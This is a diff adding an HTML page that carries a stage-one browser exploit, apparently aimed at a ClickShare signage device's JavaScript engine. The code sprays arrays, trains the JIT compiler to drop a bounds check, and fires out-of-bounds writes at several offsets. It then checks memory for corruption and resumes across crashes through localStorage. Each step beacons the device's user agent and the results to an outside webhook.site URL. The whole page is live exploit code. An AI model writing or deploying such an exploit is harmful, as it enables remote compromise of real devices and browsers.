@@ -1,0 +1,84 @@
+<html><body><script>
+// ClickShare signage -- stage 1 S4.
+// s2 (24k) and s3 (51k, PACKED_DOUBLE + dirt param) both survived clean => the param and/or the
+// packed-double literal broke the typing that makes TF elide the bounds check.
+// S4 returns to the CANONICAL poc (byte-identical to dev7965_live, the only config that ever
+// crashed the device: HOLEY_SMI new Array(5), store 0x500, literal 0xff00000000, 51k warm) and
+// changes ONE thing: the literal becomes 0xff00000000 + dirt. The Float64 typing is preserved
+// (value stays > 2^32); after Math.max + >>>0 the runtime index == dirt exactly.
+// Warm uses random dirt 0x800..0x8000 (+16..+256KB => lands in the 2MB ring, harmless-ish).
+// Fires use cursor dirts (localStorage): crash => reload resumes at next dirt.
+const SINK = 'https://webhook.site/1ccce666-4eae-419c-86a9-a4c4e16e3460';
+function beacon(t, v){
+  try { var i = new Image(); i.src = SINK + '?t=' + encodeURIComponent(t) + '&v=' + encodeURIComponent(String(v).slice(0,150)); } catch(e){}
+}
+var LS = null;
+try { LS = window.localStorage; LS.getItem('x'); } catch(e) { LS = null; }
+beacon('S4-start', navigator.userAgent.slice(0,60) + ' ls=' + (!!LS));
+try {
+  const RING = 4000;
+  var ring = [];
+  for (let k = 0; k < RING; k++) { var a = new Array(64); for (let z = 0; z < 64; z++) a[z] = 1.0 + z; ring.push(a); }
+  beacon('S4-pool-done', RING);
+
+  var fake = new Uint32Array(10);
+  fake[0]=1; fake[1]=3; fake[2]=2; fake[3]=4; fake[4]=5; fake[5]=6; fake[6]=7; fake[7]=8; fake[8]=9;
+  var tahir = 0x1;
+  var anom = 0;
+  function poc(a, dirt) {                                    // canonical body; only the literal carries +dirt
+    var oob_array = new Array(5); oob_array[0] = 0x500;
+    let just_a_variable = fake[0];
+    let another_variable3 = fake[7];
+    if (a % 7 == 0) another_variable3 = 0xff00000000 + dirt;
+    another_variable3 = Math.max(another_variable3, tahir);
+    another_variable3 = another_variable3 >>> 0;
+    var index = fake[3];
+    var for_phi_modes = fake[6];
+    let c = fake[1];
+    for (var i = 0; i < 10; i++) {
+      if (a % 3 == 0) just_a_variable = c;
+      if (a % 37 == 0) just_a_variable = fake[2];
+      if (a % 11 == 0) just_a_variable = fake[8];
+      if (a % 17 == 0) just_a_variable = fake[5];
+      if (a % 19 == 0) just_a_variable = fake[4];
+      if (a % 7 == 0 && i >= 5) { for_phi_modes = just_a_variable; just_a_variable = another_variable3; }
+      if (i >= 6) { for (let j = 0; j < 5; j++) { if (a % 5 == 0) { index = for_phi_modes; oob_array[index] = 0x500; } } }
+      for_phi_modes = c; c = just_a_variable;
+    }
+    return [index, BigInt(just_a_variable)];
+  }
+  function warm(n){
+    for (let i = 0; i < n; i++) {
+      var d = (0x800 + (Math.random() * 0x7800)) >>> 0;
+      poc(i % 500 + 2, d);
+    }
+  }
+  function sweep(tag){                                       // stores are Smi 0x500: any ring value outside
+    for (let k = 0; k < ring.length; k++) {                   // [1,65] or length!=64 is corruption evidence
+      var v = ring[k];
+      if (v.length !== 64) { if (anom++ < 4) beacon('ANOM-len','at='+tag+' k='+k+' len='+v.length); continue; }
+      for (let j = 0; j < 64; j++) { if (v[j] < 1.0 || v[j] > 65.0) { if (anom++ < 4) beacon('ANOM-val','at='+tag+' k='+k+' j='+j+' v='+v[j]); break; } }
+    }
+    beacon('S4-iter','at='+tag+' anom='+anom);
+  }
+  // canonical warm schedule
+  warm(0x500 - 1); poc(35, 0x1000); warm(50000);
+  beacon('S4-warm-done','ok');
+  sweep('warm');                       // ANOM here = warm-time elided writes landed in the ring = PRIMITIVE LIVE
+  var dirts = [8, 12, 16, 20, 24, 28, 32, 40, 48, 64];
+  var d = 0;
+  if (LS) { d = +(LS.getItem('s4cur') || 0); if (d >= dirts.length) { beacon('S4-complete','anom='+anom); throw 'done'; } }
+  function fire(){
+    if (d >= dirts.length) { beacon('S4-SURVIVED','anom='+anom); if (LS) LS.setItem('s4cur','999'); return; }
+    var dirt = dirts[d];
+    beacon('S4-fire','dirt=0x'+dirt.toString(16)+' #'+d);
+    d++;
+    if (LS) { try { LS.setItem('s4cur', String(d)); } catch(e){} }
+    setTimeout(function(){
+      try { poc(35, dirt); } catch (e) { beacon('S4-fire-exc','dirt='+dirt+':'+String(e).slice(0,80)); }
+      setTimeout(function(){ sweep('d'+dirt); setTimeout(fire, 110); }, 90);
+    }, 90);
+  }
+  setTimeout(fire, 110);
+} catch (e) { if (String(e) !== 'done') beacon('S4-exc', String(e).slice(0,120)); }
+</script></body></html>
